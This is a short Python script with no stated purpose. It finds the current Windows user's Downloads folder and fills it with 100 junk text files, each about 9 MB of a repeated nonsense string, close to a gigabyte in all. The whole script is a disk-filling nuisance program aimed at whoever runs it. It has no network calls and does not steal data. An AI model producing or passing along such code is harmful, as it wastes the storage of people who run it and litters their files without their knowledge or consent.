import os
import getpass

name = getpass.getuser()
os.chdir(f"C:\\Users\\{name}\\Downloads")

for i in range(100):
    with open(f"file{i}.txt","w") as f:
        for i in range(90000):
            f.write("jadkajdaoidaodaoidoiadDIHSJIODUFHJDIOFUHJDIKOIUFHDJKSOIDFUHDJKSOIFUGJDKOIFUGHFJUFJKDOIFUGYFJKDOIFUGYHFJDIFUG")



